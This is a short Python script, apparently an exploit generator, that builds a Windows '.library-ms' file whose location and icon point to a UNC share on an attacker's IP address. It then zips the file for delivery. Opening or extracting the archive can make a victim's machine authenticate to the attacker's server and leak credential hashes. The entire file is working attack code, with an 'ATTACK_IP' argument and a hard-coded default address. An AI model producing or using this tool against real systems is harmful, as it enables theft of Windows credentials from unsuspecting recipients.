import sys
import os
import shutil

XML_TEMPLATE = """<?xml version="1.0" encoding="utf-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <repositoryDescriptionList>
    <repositoryDescription>
      <searchConnectorDescription>
        <simpleLocation>
          <url>\\\\{ip_address}\\vulnerability_project</url>
        </simpleLocation>
      </searchConnectorDescription>
    </repositoryDescription>
  </repositoryDescriptionList>
  <iconReference>\\\\{ip_address}\\vulnerability_project\\icon.ico</iconReference>
</libraryDescription>
"""

def generate_exploit(ip_address, output_filename):
    final_xml = XML_TEMPLATE.format(ip_address = ip_address)

    if not os.path.exists(output_filename):
        os.makedirs(output_filename)

    file_path = os.path.join(output_filename, "Documents.library-ms")

    try :
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(final_xml)
        print(f"[+] Exploit successfully generated ! : {output_filename}")
        print(f"[+] Attacker's Ip address set to : {ip_address}")
        return output_filename
    except IOError as e:
        print(f"[-] Error while exploit generation : {e}")
        return None 

def generate_zip(folder_to_zip):
    if folder_to_zip is None:
        print("[-] Aborting ZIP: No folder to compress.")
        return
        
    zip_name = f"{folder_to_zip}_archive"
    try:
        shutil.make_archive(zip_name, 'zip', folder_to_zip)
        print(f"[+] ZIP created: {zip_name}.zip")
    except Exception as e:
        print(f"[-] Error creating ZIP: {e}")
        
if __name__ == "__main__":
    if len(sys.argv) == 3:
        attacker_ip = sys.argv[1]
        target_folder = sys.argv[2]
    else:
        print("Usage: python3 exploit.py <ATTACK_IP> <FOLDER_NAME>")
        print("Using default values for testing...")
        attacker_ip = "10.10.6.46"
        target_folder = "Project_Data"

    folder_created = generate_exploit(attacker_ip, target_folder)
    
    if folder_created:
        generate_zip(folder_created)